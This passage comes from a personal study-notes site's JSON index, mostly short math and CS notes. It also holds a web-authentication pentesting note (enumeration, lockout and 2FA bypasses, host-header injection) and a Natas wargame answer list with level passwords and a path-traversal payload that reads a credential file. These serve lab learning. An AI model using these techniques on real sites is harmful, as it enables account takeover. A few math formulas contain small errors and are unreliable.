Restructuring","date":"2022-01-02T10:33:43+03:00","description":null,"tags":["cs/data-structures","cs/algorithms","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Sometimes, when creating a [[/notes/Balanced Binary Search Trees|balanced tree]], [[/notes/Binary Tree Rotations|rotations]] may not be sufficient. In this case, a technique called trinode structuring comes in, which is essentially one or two rotations combined. The operation of restructuring from a node $x$ involves these steps:\n\n```\nrestructure(x):\n\tlet y be the parent and z be the grandparent of x\n\tlet (a, b, c) be these nodes in in-order traversal\n\tlet T1...T4 be the subtrees of each of these nodes.\n\trestructure the tree so that:\n```\n\n```mermaid\ngraph TD\n\tB((b)) --- A((a)) & C((c))\n\tA --- E((T1)) & F((T2))\n\tC --- G((T3)) & H((T4))\n```\n\n\n![[images/39713D8B-9E7F-4184-9630-515E9CDCD6EE.jpeg]]\n\n> Ignore the colors, here this figure is from an explanation of red-black trees."},"/notes/Tree-Terminology":{"title":"Important Tree Terminology","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"[[/notes/Tree|Tree]]s have some important terminology.\n\n```mermaid\ngraph TD\n\tA((42)) --- B((22)) & C((87))\n\tC --- D((11)) & E((21))\n\tB --- F((90))\n\tD --- G((5)) & H((6))\n\tF --- I((88)) & J((92))\n\tI --- K((89))\n```\n* **Root:** The top node. In this tree it is *42*.\n* **Internal Nodes:** Any node in a tree that has child nodes. In this case, they are *42*,*22*,*11*,*87*,*90*.*88*.\n* **External Nodes:** Any node without children. So, *5*,*6*,*21*,*92*,*89*.\n* **Ancestors:** Ancestors of a node are nodes that have a direct path that goes downwards to it. Every node is an ancestor to itself. The ancestors of node *90* is *87*,*42*,*90*\n* **Descendants:** The descendants of a node is all the nodes that this node is an ancestor to. Every node is its own descendant. For the node *90*, its descendants are *90*,*88*, *92*, *89*.\n* **Siblings:** A sibling of a node is all the nodes that share the same parent with it. For instance, the nodes *5* and *6* are siblings.\n* **Subtree:** Subtrees of a node are trees whose nodes are the children of that node.\n* **Depth:** The depth of a node is the number of edges from that node to the root.\n* **Height:**  The *longest* path from a node to a leaf.","tags":null,"aliases":null,"description":null},"/notes/Polar-form-Multiplication":{"title":"Polar form Multiplication","date":"2022-03-06T09:09:36+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Multiplying in [[/notes/Polar Coordinates|Polar Coordinates]] causes a bunch of shit to go haywire. Here are some rules: for two given polar points $z = r(cos(\\theta)+isin(\\theta))$ and $w = s(cos(\\phi)+isin(\\phi))$\n\n* $zw = rs(cos(\\theta + \\phi)+isin(\\theta + \\phi))$\n* $\\frac{z}{w} = \\frac{r}{s}(cos(\\theta - \\phi)+isin(\\theta - \\phi))$\n* $z^n = r^n(cos(n\\theta)+isin(n\\theta))$"},"/notes/Cancelling-Common-Factors-Limit":{"title":"Cancelling Common Factors","date":"2021-11-24T18:41:59+01:00","tags":["math/calculus"],"lastmodified":"2022-06-19T20:46:41.314596","content":"When you have a function such that $f(x) = \\frac{P(x)}{Q(x)}$ where $P(x)$ and $Q(x)$ are polynomials and $P(a) = Q(a) = 0$ where a is in the domain of x, we can solve the limit $\\lim_{x\\to a}$ by cancelling out a common factor between $P$ and $Q$. We know that there must be a common factor since they both have the root a so the common factor is $(x - a)$. We can calculate the other factor of the polynomial by doing polynomial division.","aliases":null,"description":null},"/notes/Partial-Dependency":{"title":"Partial Dependency","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"In a [[/notes/Relational Model|Relational Model]] that uses a [[/notes/Composite Key|Composite Key]], sometimes there might exist attributes in a relation that does not have a [[/notes/Functional Dependency|Functional Dependencies]] to all the attributes that make up the composite key. In these cases, it is said that a partial dependency has occured.","tags":null,"aliases":null,"description":null},"/notes/P-Series":{"title":"P-Series","date":"2022-01-17T05:58:15+01:00","description":null,"tags":["math/calculus","math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"P-Series(Power [[/notes/Series|Series]]) are a special kind of series such that:\n\n$$\n\\sum_{n=0}^\\infty \\frac{1}{x^p}\n$$\nThis type of series has the property that it is divergent when $p\\leq1$ and [[/notes/Convergent Series|convergent]] otherwise."},"/notes/Array":{"title":"Array","date":"2021-11-16T21:07:41+01:00","tags":["cs/data-structures","cs/lists"],"lastmodified":"2022-06-19T20:46:41.314596","content":"Arrays are data structures that allow access to its entries using indexes. They are basically an amount of space allocated in memory, and each entry in the array is placed in that space one after another. Since each entry's size is set, their location in memory is constant so accessing an element by index takes $O(1)$ time. However, they are not very flexible so, removing an element to an array, adding an element to an array that is already full, or putting an element on a certain spot, shifting the elements when necessary takes $O(n)$ time.","aliases":null,"description":null},"/notes/Full-Complete-Trees":{"title":"Full vs Complete Binary Trees","date":"2021-12-14T20:32:21+01:00","tags":["cs/trees","cs/data-structures"],"lastmodified":"2022-06-19T20:46:41.318597","content":"* In a *full*/*complete* [[/notes/Binary Tree|Binary Tree]], every node has two children, except the leaf nodes.\n* In a *complete* binary tree however, every level has the maximum number of nodes it can have. The last layer is exempted from this condition. If there are missing leaf nodes, they all have to be on the right.\n\n### A Full Binary Tree\n```mermaid\ngraph TD;\n\tA(( ))-->B(( )) & C(( ));\n\tB(( ))-->D(( )) & E(( ));\n\tC(( ))-->F(( )) & G(( ));\n```\n\n### A Complete Binary Tree\n```mermaid\ngraph TD;\n\tA(( ))-->B(( )) & C(( ));\n\tB(( ))-->D(( ));\n```\n\n#### This is not a valid complete binary tree:\n```mermaid\ngraph TD;\n\tA(( ))-->B(( )) & C(( ));\n\tB(( ))-->D(( ));\n\tC-->E(( ));\n```","aliases":null,"description":null},"/notes/Determinants-and-Row-Operations":{"title":"Determinants and Row Operations","date":"2022-03-06T10:57:42+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When you do [[/notes/Elementary Row Operations|Elementary Row Operations]] on a [[/notes/Matrixes|matrix]], the [[/notes/Determinant|Determinant]] of that matrix changes depending on the row operation:\n\n* Interchange two rows : $det(A_{new}) = -det(A)$\n* Multiply row by constant $c$: $det(A_{new}) = cdet(A)$\n* Add a multiple of a row to another row : $det(A_{new}) = det(A)$"},"/notes/Circularly-Linked-Lists":{"title":"Circularly Linked List","date":"2021-11-16T21:07:41+01:00","tags":["cs/data-structures","cs/lists"],"lastmodified":"2022-06-19T20:46:41.314596","content":"This is another type of specialized [[/notes/Linked List|Linked List]]. Normally in a linked list, the tail node would have the *next* pointer set as null. However, in Circularly Linked Lists, we instead set the tail's next element to head, essentially **circling** back to the start of the list in the end. This approach eliminates the need for a seperate *head* variable in our implementation since *head* is simple `tail.getNext()`. This makes our code more memory-efficient and also makes our logic simpler, causing our code to be easier to read. A circular linked list looks like this:\n\n```mermaid\ngraph LR\n\tA[\"1 (tail)\"]-->B[2];\n\tB-->C[3];\n\tC-->D[4];\n\tD-->E[5];\n\tE-->A;\n```","aliases":null,"description":null},"/notes/Binomial-Series":{"title":"Binomial Series","date":"2022-01-19T09:35:50+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"Binomial series are a special type of [[/notes/Power Series|Power Series]] which are used to describe functions of the form $(a+x)^r$. Even though a power series can be calculated for every single form of this function, it is often easier to calculate the power series of $(1-x)^r$ which is \n\n$$\n\\sum \\binom{r}{n} x^n\n$$\n\n> Here, we use a [[/notes/Binomial Coefficient|Binomial Coefficient]]. \n\nAfter knowing the power series for $(1-x)^r$, we can [[/notes/Power Series As Functions|treat it as a function]] and derive any function in the form $(a+x)^r$."},"/notes/Basis-of-the-null-space":{"title":"Basis of the null space","date":"2022-02-27T11:05:41+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The basis of the [[/notes/Null Space|Null Space]] of a matrix $A$ is determined using the following method.\n \n 1. Create a linear system $Ax = 0$\n 2. Convert it into [[/notes/Parametric Vector Form|Parametric Vector Form]]\n 3. The column vectors in this parametric vector form are the basis of the null space."},"/notes/Composite-Key":{"title":"Composite Key","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases","cs/theory"],"lastmodified":"2022-06-19T20:46:41.314596","content":"It is possible that in a database schema, there are no [[/notes/Candidate Key|Candidate Key]]s, which means that there is no attribute that is enough to act as a unique identifier for the tuples in the database. In those cases, it is possible that the combintion of more than one attribute can act as a key. The subset of attributes of a composite key cannot act as a key but when they come together, they can.","aliases":null,"description":null},"/notes/Transitive-Dependency":{"title":"Transitive Dependency","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"Let's say in your [[/notes/Relational Model|Relational Model]], you have two [[/notes/Functional Dependency|Functional Dependencies]]s as such:\n\n```\n{A} -> {B}\n{B} -> {C}\n```\nHowever the dependency `{A}->{C}` is not specified. Because of the transitive property of the functional dependency relation, this dependency can be inferred. This is called a transitive dependency.","tags":null,"aliases":null,"description":null},"/notes/Double-Integrals-Over-Rectangles":{"title":"Double Integrals Over Rectangles","date":"2022-03-06T08:04:01+01:00","description":null,"tags":["math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"When the $\\Delta A$ approaches zero while calculating the [[/notes/3D Riemann Sum on Rectangles|3D Riemann Sum on Rectangles]], it can be written as an integral. An integral for a function that calculates the area under a function $f(x,y)$ over a rectangle $D$ is written as:\n\n$$\n\\iint_D f(x,y) dA\n$$"},"/notes/Alternating-Series-Test":{"title":"Alternating Series Test","date":"2022-01-17T06:38:44+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"An alternating series is basically a series whose terms' signs are changing regularly. They often have the form\n\n$$\n\\sum_{n=1}^\\infty (-1)^n a_n\n$$\n\nin order for such a series to converge, it needs to satisfy all three of the requirements below:\n\n1. It is alternating.\n2. $|a_{n+1}| < |a_n|$ for all $n$\n3. $\\lim_{n\\to\\infty} a_n = 0$"},"/notes/Characteristic-Equation":{"title":"Characteristic Equation","date":"2022-03-20T06:54:53+01:00","description":null,"tags":["math/linear","math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"A scalar $\\lambda$ is a [[/notes/Matrixes|matrix]] $A$'s [[/notes/Eigenvalues|eigenvalue]] iff the [[/notes/Determinant|Determinant]] of $A - \\lambda I$ is $0$.\n\n> The equation $det(A - \\lambda I) = 0$ is called the characteristic equation\n\n> The polynomial $det(A - \\lambda I)$ is called the characteristic polynomial"},"/notes/Conditions-For-Diagonalization":{"title":"Conditions For Diagonalization","date":"2022-03-20T08:31:52+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"To check if a [[/notes/Matrixes|matrix]] is [[/notes/Diagonalization|diagonalizable]], there are two conditions:\n\n- For an $n \\times n$ matrix, the matrix must have $n$ [[/notes/Linear Indepence and Dependence|linearly independent]] [[/notes/Eigenvectors|Eigenvectors]]\n\t- This is always true if $A$ has $n$ distinct [[/notes/Eigenvalues|Eigenvalues]]\n\t\n- More generally, $a.m.(\\lambda) = g.m.(\\lambda)$ for all eigenvalues of $A$.\n\t- As a proof, think about this, $g.m(\\lambda)$ tells us how many linearly independent eigenvectors exist for an eigenvalue $\\lambda$ (due to the definition of [[/notes/Dimension|Dimension]]). Moreover, since the sum of all the algebraic multiplicities must equal $n$, it is clear that when the algebraic multiplicity is equal to geometric multiplicity for all eigenvalues, we have $n$ linearly independent eigenvectors."},"/notes/Uses-of-a-Stack-Data-Structure":{"title":"Uses of a Stack in Real Life","date":"2021-11-23T09:00:33+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"The [[/notes/Stack|Stack]] data structure is very useful in real-world\n \n* **Low-Level Programs** A stack is used in order store temporary variables, pass arguments to functions.\n* **Matching parantheses/HTML tags** A stack is very useful when matching parantheses and HTML tags due to its last in first out design.","tags":null,"aliases":null,"description":null},"/notes/Minor-Matrix":{"title":"Minor Matrix","date":"2022-03-06T10:27:38+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The minor [[/notes/Matrixes|matrix]] $A_{ij}$ of a matrix $A$, is the matrix denoted by deleting the $i^{th}$ row and $j^{th}$ column from the matrix $A$."},"/notes/Closed-Form-Equation":{"title":"Closed Form Equation","date":"2021-12-21T08:32:46+03:00","description":null,"tags":["math/algebra"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"A closed form equation in mathematics is an equation that can be represented using a finite number of primitive equations, i.e. they do not have any recursion."},"/notes/Sequences":{"title":"Sequences","date":"2022-01-17T05:08:20+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Sequences are basically lists real numbers. In a sequence, there is a real number for each postive integer. So, sequences can also be defined as functions such that $f(n): \\mathbb{Z}^+\\implies\\mathbb{Q}$. They can also ne written down as:\n\n$$\na_1, a_2, a_3, a_4 ... a_n\n$$"},"/notes/Big-Oh-Notation":{"title":"Big-Oh Notation","date":"2021-11-16T21:07:41+01:00","tags":["cs/math","cs/analysis"],"aliases":["Big-Oh Complexity"],"lastmodified":"2022-06-19T20:46:41.314596","content":"Big-Oh notation is a way of calculating the maximum time an algorithm can take\nrelative to its input size. The two ways to calculate big-oh notation is:\n\n## The easy way\n\nBasically, if you have a function that consists of different versions of the\n[[/notes/7 Important Functions|7 Important Functions]] the one with the highest order/the one that changes\nwith the highest values have the highest precedence. So, for example, the\nfunction $f(n) = 2n + n^2 + 3nlog_2(n) + 2^n + 6$ has the Big-Oh $O(2^n)$ since\nexponential functions have the highest order. \n\n\n## The big-boy mathematical way\n\nThe formal definition of Big-Oh is:\n $f(n)$ and $g(n)$ are both functions $\\mathbb{Z}^+ \\mapsto \\mathbb{R}^+$.\n $f(n)$ is $O(g(n))$ if there is a real constant $c > 0$ and an integer\n constant $n_0 \\geq 1$ that makes $f(n)$ less than or equal to $c \\times g(n)$\n for all values $n \\geq n_0$. This can be written in predicate logic as\n such:[^1]\n\n$$\\exists c,n_0(\\forall x(x \\geq n_0 \\implies cg(x) \\geq f(x))) \\implies f(n) \\in O(g(n))$$\n\n![Big-Oh Graph](images/Pastedimage20211112111455.png)\n\n[^1]:$f(n) \\in O(g(n))$ is a more mathematical way of saying $f(n)$ is $O(g(n))$.","description":null},"/notes/Vectors":{"title":"Vectors","date":"2022-02-27T10:27:42+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"Vectors are basically [[/notes/Matrixes|Matrixes]] with one column or one row. They are used to represent a point, in space, or more oftenly a line with a direction with magnitude."},"/notes/Post-Order-Traversal":{"title":"Post-Order Tree Traversal","date":"2021-12-14T20:32:21+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Another depth-first [[/notes/Tree Traversal|Tree Traversal]] algorithm commonly used is post-order traversal. It differs from [[/notes/Pre-Order Traversal|Pre-Order Tree Traversal]] in the way that it first visits the children of a node before visiting the node itself.\n\n![[images/Postorder-traversal.gif]]","tags":null,"aliases":null,"description":null},"/notes/Converting-ER-Diagrams-to-a-Relational-Model":{"title":"Converting ER Diagrams to a [[Relational Model]]","date":"2021-12-14T20:32:21+01:00","tags":["cs/diagrams","cs/databases"],"lastmodified":"2022-06-19T20:46:41.314596","content":"Even though [[/notes/ER Diagrams|ER Diagrams]] contain more semantic information, they are harder to turn into actual databases because some of the constraints are impossible to represent.\n\n## Simple Entities\nWhen you have an entitity without any relations connected to it, all you need to do is to create an entry in the schema with the given attributes.\n\n## N:M Relation Type\nWith an N:M relationship, you need to create a new entry in the schema to represent that relation. Here is a more visual example:\n![[images/2F8F54F0-8071-4BA7-9A5D-00D35EC80228.jpeg]]\n\n## 1:M Relationship\nIn this case you just push the relationship information to the side with the * cardinality.\n![[images/367FF726-2F89-4733-A3B2-EFF81FB72BB7.jpeg]]\n\n## 1:1 Cardinality\nSame as the 1:M one, just need to pick a side to put the relation.\n\n## Attributes Attached to Relation\nWhen attributes are attached to a relation, you simply add another attribute to the relation.\n\n## [[/notes/ER Diagrams Weak Entity and Identifying Relationship|Weak Entity and Identifying Relationship in ER Diagrams]]\nSince weak entities are defined using the identifying relationship, you put the relationship in the weak entity.\n\n## Composite Attributes\nYou just flatten them\n\n## Multi-Attribute\nTreat the attribute as a relation and create a new relation with a cardinality of 1:N.\n\n## Inherited Attributes and Relations\nCreate a single entity that contains all the attributes and relations from all types and add an extra attribute type.","aliases":null,"description":null},"/notes/Weak-Entity":{"title":"Weak Entity","date":"2021-12-21T04:29:53+01:00","description":null,"tags":["cs/databases"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"A weak [[/notes/Entity|Entity]] in database theory is an entity that cannot exist without another entity. In other words, they are dependant on and defined by another entity. They are often accompanied by [[/notes/Identifying Relationship|Identifying Relationship]]s."},"/notes/Comparison-Test":{"title":"Comparison Test","date":"2022-01-17T06:46:56+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"This test is similar to [[/notes/The Squeeze Theorem - Limits|the squeeze theorem]]. Given two series, $\\sum a_n$ $\\sum b_n$ with positive terms, if  $\\sum b_n$ is convergent and $a_n \\leq b_n$ for all $n$, then $\\sum a_n$ converges. \n\nSimilarly, if $\\sum b_n$ diverges and $a_n \\geq b_n$, then $\\sum a_n$ must also diverge."},"/notes/24-Trees":{"title":"(2,4) Trees","date":"2022-01-03T01:01:08+03:00","description":null,"tags":["cs/data-structures","cs/trees"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"(2,4) trees are basically [[/notes/Multiway Search Trees|Multiway Search Trees]] with two added rules:\n\n- Every internal node can have at most 4 children\n- Every external node has the same depth\n\nIn order to sustain this property, some checks and resutructuring often needs to be made in order to sustain this (2,4) tree property."},"/notes/Multivalued-Function-Gradient":{"title":"Multivalued Function Gradient","date":"2022-01-19T04:43:17+01:00","description":null,"tags":["math/calculus","math/multivar"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"[[/notes/Multivariable Functions|Multivariable Functions]]' derivatives change according to which way you move. However, the gradient of a multivariable function is basically the direction/[[/notes/Vectors|vector]] in which the gradient is maximal. It is basically calculated as such:\n\n$$\n\\triangledown f(x,y) = \\langle \\frac{\\partial f}{\\partial x}(x,y), \\frac{\\partial f}{\\partial y}(x,y) \\rangle\n$$"},"/notes/Complex-Eigenvalues":{"title":"Complex Eigenvalues","date":"2022-03-20T10:18:25+01:00","description":null,"tags":["math/linear","math/analysis"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.314596","content":"The [[/notes/Eigenvalues|Eigenvalues]] of a given [[/notes/Matrixes|matrix]] don't always have to be real, they can also be [[/notes/Complex Numbers|Complex Numbers]]. If $\\lambda$ is an eigenvalue, than $\\overline{\\lambda}$ is also an eigenvalue with $\\overline{v}$ as its [[/notes/Eigenvectors|eigenvector]]."},"/notes/Good-Relational-Database-Design":{"title":"What makes a Relational Database Design Good?","date":"2021-12-14T20:32:21+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"* **Minimal Redundancy:** The less a database repeats the data in it, the better. Redundancy can cause issues such as [[/notes/Deletion Anomalies|Deletion Anomalies]]\n* **Prevents Modification Anomalies by Design:** This means anomalous modifications are prevented by using keys, not by enforcing an excessive amount of contraints. Otherwise, [[/notes/Update Anomalies|Update Anomalies]] may occur.\n* **Matching the used RDBMS:** This provides faster query processing, but for this, redundancy can be necessary.","aliases":null,"description":null},"/notes/Authentication":{"title":"Authentication","date":"2021-11-16T21:07:41+01:00","tags":["cs/security"],"lastmodified":"2022-06-19T20:46:41.314596","content":"- [ ] Split this into multiple notes\n# Authentication\n\nAuthentication vulnerabilities are one of the simpler ones. Yet, due to obvious reasons, they can have very serious impacts. Finding authentication bugs usually have a puzzle-solving nature to them. Authentication is the process of identifying the identity of a person, this is what sets the difference between *authentication* and *authorisation*. Authorisation is the process of checking whether a user has access to a resource and permitting or denying requests for that resource based on the user\\'s permissions.\n\n## Brute Force Protection\n\n### Username enumeration\n\n1.  Using Differences in response contents\n\n    This method is **very** simple, you compare the responses of the web application when a valid username is sent to the response to an invalid username. If there are any *consistent* differences, you can enumerate usernames.\n\n2.  Difference in response times\n\n    Because web applications have to first hash the password and then compare the hashes, sometimes developers check whether the username is valid and then hash the password in order to save resources. However because hashing is a process that takes time, an attacker can send a very long password which takes a long time to hash. Since the server would only hash this password if the username is valid, the attacker can deduce whether a username exists or not by looking at the response time.\n\n### Flawed Brute Force Protection\n\nThere are two ways that brute force protection can be implemented. THe system can lock a user\\'s account after too many failed login attempts or the ip of the attacker can be blocked after a number of failed attempts.\n\n1.  Bypassing IP Blocks\n\n    The [X-Forwarded-For header](web_bypasses.org::*X-Forwarded-For header) trick can be used. Also, some applications reset the ip restrictions once somebody is logged-in from that account. Or, in some web applications, you can submit multiple credentials in a single request. Here is an example:\n\n    ``` json\n    {\"username\":\"yeet\",\"password\":\"pass\"}\n    ```\n\n    ``` json\n    {\"username\":\"yeet\",\"password\":[\"pass\",\"pass2\"]}\n    ```\n\n2.  Bypassing Account Locks\n\n    Sometimes, when an account is locked but the login details are correct, web applications return a different response then when the account is blocked and the credentials are wrong. This can be used to identify the credentials of an account even if it gets locked.\n\n## 2FA (Two Factor Authentication)\n\n2FA is often considered to be a very secure way for authentication since even if a user\\'s credentials are compromised, an attacker can\\'t login to the user\\'s account. However, due to its advanced nature, it is often prone to vulnerabilities and should be tested with care.\n\n-   Sometimes, when a user logs in and is redirected to a 2FA page, a session gets created anyways and a user can use the account without entering the 2FA Code. This is a very rare case however.\n-   In some cases, the web applications uses a cookie that depends on the user\\'s username in order to check whether the 2FA codes match instead of creating and using a session token. This can be exploited to brute-force a user\\'s 2FA token only which can allow an attacker to access an account without knowing the credentials.\n-   When websites fail to apply rate-limiting on 2FA systems, you can brute force 2FA codes. In cases where the application logs a user out after a number of failed retries, you can use [Macros](burpsuite.org::*Macros) in order to log back in.\n\n## Password Change\n\nPassword change functionalities can be vulnerable to Host Header injections. By changing the `Host` header in forgot password requests, you can alter the url that the web applications refers to in its e-mail that it sends. This opens up the possibility for phishing attacks.\n\n-   When changing the Host header breaks the application, if a middleware is being used you can instead send a `X-Forwarded-Host` header in your request which could have the same effect of changing the Host header without breaking the application.\n-   Also, editing the port number in a Host header is sometimes useful as well. The ability to inject non-numeric parameters to the port number could potentially allow an attacker to execute Dangling HTML attacks or simply alter the url being visited by changing the URL to the form of `username:password@domain`","aliases":null,"description":null},"/notes/Limit-Comparison-Test":{"title":"Limit Comparison Test","date":"2022-01-18T10:11:58+01:00","description":null,"tags":["math/analysis","math/calculus"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"Similar to the [[/notes/Comparison Test|Comparison Test]], given two series, $\\sum a_n$ and $\\sum b_n$ all with positive terms, calculating the limit:\n\n$$\n\\lim_{n\\to\\infty}\\frac{a_n}{b_n} = c\n$$\n\nIf $c$ is a finite number and $c > 0$, either both series converge or diverge."},"/notes/Matrix-Vector-Product":{"title":"Matrix-Vector Product","date":"2022-02-22T06:35:56+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The product of a matrix $A$ and a [[/notes/Vectors|vector]] $v$ can be written as:\n\n$$\nAx = \n\\begin{bmatrix}\na_1 & a_2 & ... & a_n\n\\end{bmatrix}\n\\begin{bmatrix}\nx_1 \\\\\nx_2 \\\\\n... \\\\\nx_n\n\\end{bmatrix} = \nx_1a_1 + x_2a_2 + ... + x_na_n\n$$\n\n> Here entries in the form $a_c$ are all vectors\n\n## Properties of matrix vector products\n\n1. $A(u+v) = Au + Av$\n2. $A(cu) = cA(u)$"},"/notes/The-floor-and-ceil-functions":{"title":"The floor and ceil functions","date":"2021-11-16T21:07:41+01:00","tags":["math/analysis","math/algebra"],"lastmodified":"2022-06-19T20:46:41.322597","content":"There are two important functions that will come in handy throughout this course, *ceil* $\\lceil x \\rceil$ and *floor* $\\lfloor x \\rfloor$. Ceil basically rolls the number x into the closest greater integer, and floor the other way around, so $\\lceil 16.2 \\rceil = 17$ and $\\lfloor 16.2 \\rfloor = 16$.","aliases":null,"description":null},"/notes/Homogenous-Linear-Systems":{"title":"Homogenous Linear Systems","date":"2022-02-22T07:14:07+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A system $Ax = b$ is homogenous if $b=0$, non-homogenous otherwise.\n\n> A homogenous system is always [[/notes/Consistent and Inconsistent Systems|consistent]]"},"/notes/Vigenere":{"title":"The vigenere cipher","date":"2021-11-16T21:07:41+01:00","lastmodified":"2022-06-19T20:46:41.322597","content":"The encrypted message and a key's value is added together and the result\\'s modulo 26 is taken to prevent unprintable characters. Here is an example:\n\n    If we use the key(K)  'GOLD', and P = PROCEED MEETING AS AGREED, then \"add\"\n    P to K, we get C.  When adding, if we exceed 25, then we roll to 0 (modulo 26).\n\n\n    P     P R O C E   E D M E E   T I N G A   S A G R E   E D\n    K     G O L D G   O L D G O   L D G O L   D G O L D   G O\n\n    becomes:\n\n    P     15 17 14 2  4  4  3 12  4 4  19  8 13 6  0  18 0  6 17 4 4   3\n    K     6  14 11 3  6 14 11  3  6 14 11  3  6 14 11  3 6 14 11 3 6  14\n    C     21 5  25 5 10 18 14 15 10 18  4 11 19 20 11 21 6 20  2 8 10 17","tags":null,"aliases":null,"description":null},"/notes/Trivial-Solution":{"title":"Trivial Solution","date":"2022-02-23T12:38:03+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.322597","content":"A trivial solution of a linear system of equations is the **0 vector**."},"/notes/Eigenspace":{"title":"Eigenspace","date":"2022-03-20T06:15:40+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"The [[/notes/Subspace|Subspace]] of [[/notes/Eigenvectors|Eigenvectors]] that have the [[/notes/Eigenvalues|eigenvalue]] $\\lambda$ is called the eigenspace of that eigenvalue and is represented by $E_\\lambda$. The eigenspace is found by calculating the [[/notes/Null Space|Null Space]] of $A - \\lambda I$. Or more mathematically:\n \n$$\nE_{\\lambda}= Nul(A - \\lambda I)\n$$"},"/notes/Sentinel-Nodes":{"title":"Sentinel Nodes","date":"2021-11-16T21:07:41+01:00","lastmodified":"2022-06-19T20:46:41.318597","content":"Sometimes, when implementing [[/notes/Linked List|Linked List]], especially [[/notes/Doubly Linked List|Doubly Linked List]], it makes our job much easier to implement sentinel nodes. Sentinel nodes are basicaly *dummy* nodes that are defined with the list, called **header** and **tailer**. By using these dummy nodes, our job is greatly simplified due to several reasons:\n* We don't have to implement seperately the `addFirst()` and `addLast()` method since every add operation is made between two nodes,(even in an empty list, nodes are added between **header** and **tailer**).\n* The header and tailer nodes remain constant in the list.","tags":null,"aliases":null,"description":null},"/notes/EER-Diagram-Subclasses":{"title":"ER Diagram Subclasses and Superclasses","date":"2021-11-23T14:10:26+01:00","tags":["cs/databases"],"lastmodified":"2022-06-19T20:46:41.318597","content":"Sometimes when drawing[[/notes/ER Diagrams|ER Diagrams]], sometimes you need to represent a subclass and superclass relationship between entities when they share attributes and relations. In order to represent this, we have disjoint and overlapping subclass relationships. If a subclass entity is overlapping, an entity can belong to multiple entity types of those subclasses. In disjoint relationships, an entity can belong to only one entity type. More importantly, when defining subclass relationships, the connection between the disjoint/overlapping and the superclass entity should be total participation ([[/notes/ER Diagram Total Participation|Total Participation in ER Diagrams]]) so that every entity belonging to the superclass must be a subclass.\n\n![[images/20211123145942.png]]","aliases":null,"description":null},"/notes/Solution-of-Non-Homogenous-Systems":{"title":"Solution of Non-Homogenous Systems","date":"2022-02-23T12:47:43+01:00","description":null,"tags":["math/linear"],"aliases":[""],"lastmodified":"2022-06-19T20:46:41.318597","content":"A [[/notes/Consistent and Inconsistent Systems|consistent]] non-homogenous system $Ax=b$'s solution is $x=x_p + x_h$. In which \n\n* $x_p$ is a special solution for the homogenous system $Ax=b$\n* $x_h$ is the solution for homogenous system $Ax=0$\n\n![[images/9EF24D23-2E2B-468D-8299-3D780C3DE157.jpeg]]\n\n## Proof\n\nLet $Ax = b$ be a non-homogenous system. And let $x_p$ be a solution for $Ax = b$. This means that:\n\n$$\nAx = b\n$$\n$$\nAx - Ax_p = b - Ax_p\n$$\n$$\nA(x-x_p) = 0\n$$"},"/notes/OverTheWire-Natas":{"title":"OverTheWire Natas","date":"2021-11-16T21:07:41+01:00","tags":["cs/security","cs/web"],"lastmodified":"2022-06-19T20:46:41.318597","content":"-   **natas0**: in comments (gtVrDuiDfck831PqWsLEZy5gyDz1clto)\n-   **natas1**: in comments too (ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi)\n-   **natas2**: /files/users.txt (sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14)\n-   **natas3**: /robots.txt (Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ)\n-   **natas4**: Referrer header (iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq)\n-   **natas5**: cookie loggedin (aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1)\n-   **natas6**: includes/secret.inc (7z3hEENjQtflzgnT29q7wAvMNfZdh0i9)\n-   **natas7**: ?page=../../../../etc/natas~webpass~/natas8 (DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe)\n-   **natas8**: `echo 'echo base64_decode(strrev(hex2bin(\"3d3d516343746d4d6d6c315669563362\")));' | php -a` 